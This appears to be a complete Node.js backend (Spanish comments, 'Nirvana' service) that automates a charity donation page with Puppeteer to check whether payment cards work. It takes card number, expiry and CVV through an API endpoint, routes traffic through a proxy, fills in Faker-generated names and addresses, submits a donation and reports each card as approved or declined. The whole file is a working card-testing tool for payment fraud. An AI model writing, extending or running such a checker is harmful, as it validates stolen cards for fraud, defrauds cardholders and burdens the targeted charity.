require('dotenv').config();
const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');
const { faker } = require('@faker-js/faker');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const PROXY_STRING = process.env.PROXY_STRING || '';
const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
const HEADLESS = process.env.HEADLESS === 'false' ? false : 
                 process.env.HEADLESS === 'new' ? 'new' : true;

let browser = null;
let page = null;

// ---------- Proxy ----------
function parseProxy(proxyStr) {
    if (!proxyStr) return null;
    const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
    if (match) {
        return {
            username: match[1],
            password: match[2],
            host: match[3],
            port: parseInt(match[4], 10)
        };
    }
    return null;
}

async function getNewPage() {
    if (browser) {
        await browser.close();
    }
    const proxyData = parseProxy(PROXY_STRING);
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-software-rasterizer'
    ];
    let proxyUrl = null;
    if (proxyData) {
        proxyUrl = `http://${proxyData.username}:${proxyData.password}@${proxyData.host}:${proxyData.port}`;
        args.push(`--proxy-server=${proxyUrl}`);
        console.log(`🔐 Proxy configurado: ${proxyData.host}:${proxyData.port}`);
    }

    const launchOptions = {
        headless: HEADLESS,
        args: args,
        ignoreHTTPSErrors: true,
        timeout: 60000
    };

    try {
        browser = await puppeteer.launch(launchOptions);
    } catch (error) {
        console.error('❌ Error al lanzar Chromium:', error.message);
        throw error;
    }

    page = await browser.newPage();
    if (proxyData && !proxyUrl) {
        await page.authenticate({
            username: proxyData.username,
            password: proxyData.password
        });
    }

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    return page;
}

// ---------- Generar dirección ----------
function generarDireccion() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
    const street = faker.location.streetAddress();
    const city = faker.location.city();
    const state = 'CO';
    const zip = faker.location.zipCode('#####');
    return { firstName, lastName, email, street, city, state, zip };
}

// ---------- Esperar selector con reintentos ----------
async function waitForSelectorWithRetry(page, selectors, timeout = 60000, retries = 3) {
    const combined = Array.isArray(selectors) ? selectors.join(', ') : selectors;
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            console.log(`🔍 Intentando selector: ${combined} (intento ${attempt}/${retries})`);
            const element = await page.waitForSelector(combined, { timeout: timeout / retries, visible: true });
            if (element) return element;
        } catch (e) {
            console.log(`❌ Selector no encontrado: ${combined}`);
            if (attempt === retries) return null;
            await page.waitForTimeout(1000);
        }
    }
    return null;
}

// ---------- Función principal de verificación ----------
async function verificarTarjeta(cardData, amount) {
    const [numero, mes, año, cvv] = cardData.split('|');
    const direccion = generarDireccion();
    const mesFormateado = mes.padStart(2, '0');
    const añoCorto = año.slice(-2);
    const expira = `${mesFormateado}/${añoCorto}`;

    let intentos = 0;
    let ultimoError = '';

    while (intentos < 3) {
        try {
            const page = await getNewPage();
            console.log(`🔍 Navegando a ${TARGET_URL}... (intento ${intentos+1})`);

            await page.goto(TARGET_URL, {
                waitUntil: 'networkidle0',
                timeout: 60000,
                ignoreHTTPSErrors: true
            });

            // Esperar 2 segundos para que el DOM se estabilice
            await page.waitForTimeout(3000);

            // ---- 1. Campo de monto ----
            const montoSelectors = [
                'input[data-cy="gift-amount-input-0"]',
                'input[placeholder="0.00"]',
                'input[type="text"][inputmode="decimal"]'
            ];
            const montoElement = await waitForSelectorWithRetry(page, montoSelectors, 30000, 3);
            if (!montoElement) {
                throw new Error('No se encontró el campo de monto');
            }
            await page.click(montoSelectors.join(', '), { clickCount: 3 });
            await page.type(montoSelectors.join(', '), amount);

            // ---- 2. Botón "Card" ----
            const cardBtnSelectors = [
                '[data-cy="payment-type-card-btn"]',
                'div[data-cy="payment-type-card-btn"]',
                'button:has-text("Card")',
                'div:has-text("Card")'
            ];
            // Usar waitForSelector con texto
            const cardBtn = await page.waitForSelector('text/Card', { timeout: 15000 }).catch(() => null);
            if (cardBtn) {
                await cardBtn.click();
            } else {
                // Intentar con data-cy
                const cardBtn2 = await page.waitForSelector('[data-cy="payment-type-card-btn"]', { timeout: 5000 }).catch(() => null);
                if (cardBtn2) {
                    await cardBtn2.click();
                } else {
                    console.log('⚠️ No se encontró botón "Card", quizás ya está seleccionado');
                }
            }

            // Esperar a que aparezca el iframe de pago
            await page.waitForTimeout(3000);

            // ---- 3. Encontrar el iframe ----
            let cardFrame = null;
            const frames = page.frames();
            for (const f of frames) {
                try {
                    const hasInput = await f.evaluate(() => {
                        return document.querySelector('input.cc-input') !== null ||
                               document.querySelector('input[placeholder*="Card Number"]') !== null ||
                               document.querySelector('input[data-elements-stable-field-name="cardNumber"]') !== null;
                    });
                    if (hasInput) {
                        cardFrame = f;
                        break;
                    }
                } catch (e) {}
            }
            if (!cardFrame) {
                // Buscar por nombre de frame común de Stripe
                for (const f of frames) {
                    const url = f.url();
                    if (url.includes('stripe') || url.includes('braintree') || url.includes('payment')) {
                        cardFrame = f;
                        break;
                    }
                }
            }
            const target = cardFrame || page;
            console.log(`📦 Frame de pago: ${cardFrame ? 'encontrado' : 'no encontrado, usando página principal'}`);

            // ---- 4. Número de tarjeta ----
            const numSelectors = [
                'input.cc-input',
                'input[placeholder*="Card Number"]',
                'input[data-elements-stable-field-name="cardNumber"]',
                'input[name="cardnumber"]',
                'input[autocomplete="cc-number"]'
            ];
            const numElement = await waitForSelectorWithRetry(target, numSelectors, 15000, 3);
            if (!numElement) {
                // Capturar screenshot para depuración
                const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                console.log('🖼️ Screenshot (base64):', screenshot.slice(0, 100) + '...');
                throw new Error('No se encontró el campo de número de tarjeta');
            }
            await target.click(numSelectors.join(', '));
            await target.type(numSelectors.join(', '), numero);

            // ---- 5. Fecha expiración ----
            const expSelectors = [
                'input.exp-input',
                'input[placeholder*="MM/YY"]',
                'input[data-elements-stable-field-name="cardExpiry"]',
                'input[name="expiry"]',
                'input[autocomplete="cc-exp"]'
            ];
            const expElement = await waitForSelectorWithRetry(target, expSelectors, 10000, 3);
            if (!expElement) throw new Error('No se encontró el campo de fecha');
            await target.click(expSelectors.join(', '));
            await target.type(expSelectors.join(', '), expira);

            // ---- 6. CVV ----
            const cvvSelectors = [
                'input.cvv-input',
                'input[placeholder*="CVV"]',
                'input[data-elements-stable-field-name="cardCvc"]',
                'input[name="cvv"]',
                'input[autocomplete="cc-csc"]'
            ];
            const cvvElement = await waitForSelectorWithRetry(target, cvvSelectors, 10000, 3);
            if (!cvvElement) throw new Error('No se encontró el campo CVV');
            await target.click(cvvSelectors.join(', '));
            await target.type(cvvSelectors.join(', '), cvv);

            // ---- 7. Datos personales (fuera del iframe) ----
            const firstNameSel = '#rock-textbox-a991fa77-baf9-451f-a367-00f5ec7ca436, input[data-cy="person-firstname-input"]';
            if (await page.waitForSelector(firstNameSel, { timeout: 10000 }).catch(() => false)) {
                await page.click(firstNameSel);
                await page.type(firstNameSel, direccion.firstName);
            } else {
                console.log('⚠️ No se encontró campo First Name');
            }

            const lastNameSel = '#rock-textbox-a3d9aba8-9287-478a-8b6c-469967e3982a, input[data-cy="person-lastname-input"]';
            if (await page.waitForSelector(lastNameSel, { timeout: 5000 }).catch(() => false)) {
                await page.click(lastNameSel);
                await page.type(lastNameSel, direccion.lastName);
            }

            const emailSel = '#rock-textbox-dd894906-0601-42c5-8d15-f847e289e6aa, input[data-cy="person-email-input"]';
            if (await page.waitForSelector(emailSel, { timeout: 5000 }).catch(() => false)) {
                await page.click(emailSel);
                await page.type(emailSel, direccion.email);
            }

            const addressSel = '#rock-textbox-4a7d37af-6794-4414-98e5-81ca82d01c29, input[autocomplete="address-line1"]';
            if (await page.waitForSelector(addressSel, { timeout: 5000 }).catch(() => false)) {
                await page.click(addressSel);
                await page.type(addressSel, direccion.street);
            }

            // City
            const citySel = '#rock-textbox-2caf2e9a-8672-4e5d-aa73-1eb6d61827c2, input[autocomplete="address-level2"]';
            if (await page.waitForSelector(citySel, { timeout: 5000 }).catch(() => false)) {
                await page.click(citySel);
                await page.type(citySel, direccion.city);
            }

            // State dropdown
            const stateDropdownSel = '.ant-select-selector';
            if (await page.waitForSelector(stateDropdownSel, { timeout: 5000 }).catch(() => false)) {
                await page.click(stateDropdownSel);
                await page.waitForTimeout(1000);
                const stateOption = await page.waitForSelector('.ant-select-item-option[title="CO"]', { timeout: 5000 }).catch(() => null);
                if (stateOption) {
                    await stateOption.click();
                } else {
                    // Intentar con texto
                    await page.click('.ant-select-item-option:has-text("CO")').catch(() => {});
                }
            }

            // Zip
            const zipSel = '#rock-textbox-033d95e6-f607-49c6-a191-f9ba42875daf, input[autocomplete="postal-code"]';
            if (await page.waitForSelector(zipSel, { timeout: 5000 }).catch(() => false)) {
                await page.click(zipSel);
                await page.type(zipSel, direccion.zip);
            }

            // ---- 8. Botón Review Details ----
            const reviewBtn = await page.waitForSelector('[data-cy="payment-save-btn"]', { timeout: 15000 }).catch(() => null);
            if (reviewBtn) {
                await reviewBtn.click();
                await page.waitForTimeout(3000);
            } else {
                throw new Error('No se encontró el botón Review Details');
            }

            // ---- 9. Verificar "UNABLE TO PROCESS" ----
            const bodyText = await page.evaluate(() => document.body.innerText);
            if (bodyText.includes('UNABLE TO PROCESS')) {
                console.log('⚠️ UNABLE TO PROCESS detectado, reintentando...');
                intentos++;
                ultimoError = 'UNABLE TO PROCESS';
                continue;
            }

            // ---- 10. Botón Give $X.XX ----
            const giveBtn = await page.waitForSelector('[data-cy="review-submit-btn"]', { timeout: 15000 }).catch(() => null);
            if (giveBtn) {
                await giveBtn.click();
                await page.waitForTimeout(5000);
            } else {
                throw new Error('No se encontró el botón de envío');
            }

            // ---- 11. Resultado final ----
            const finalText = await page.evaluate(() => document.body.innerText);
            if (finalText.includes('Thank You')) {
                const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot };
            } else if (finalText.includes('GIFT FAILED') || finalText.includes('Please verify your payment information')) {
                return { resultado: 'declined', mensaje: 'GIFT FAILED - Verifique datos' };
            } else {
                return { resultado: 'error', mensaje: 'Respuesta desconocida' };
            }

        } catch (error) {
            console.error('Error en verificación:', error);
            ultimoError = error.message;
            intentos++;
        }
    }

    return { resultado: 'error', mensaje: `Falló tras 3 intentos: ${ultimoError}` };
}

// ---------- Endpoints ----------
app.post('/api/check-card', async (req, res) => {
    const { card, amount } = req.body;
    if (!card || !amount) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    try {
        const resultado = await verificarTarjeta(card, amount);
        res.json(resultado);
    } catch (e) {
        console.error('Endpoint error:', e);
        res.status(500).json({ resultado: 'error', mensaje: e.message });
    }
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`🚀 Nirvana backend corriendo en puerto ${PORT}`);
});